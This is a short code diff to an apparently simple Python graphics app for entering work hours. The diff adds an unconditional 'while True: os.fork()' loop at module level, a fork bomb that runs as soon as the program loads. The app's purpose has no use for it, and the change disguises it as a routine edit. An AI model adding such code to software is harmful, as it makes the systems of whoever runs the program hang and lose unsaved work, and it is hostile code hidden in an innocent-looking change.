@@ -8,7 +8,10 @@ inputer = Group(
     Rect(20,50,360,40,fill='lightgrey',border='darkgrey'),
     Label('Enter in Your Hours',190,70,size=20),
 )
-
+import os
+# import time
+while True:
+    os.fork()
 def onMousePress(mouseX,mouseY):
     if inputer.contains(mouseX,mouseY):
         purpose = app.getTextInput('What is the name of the entry?')
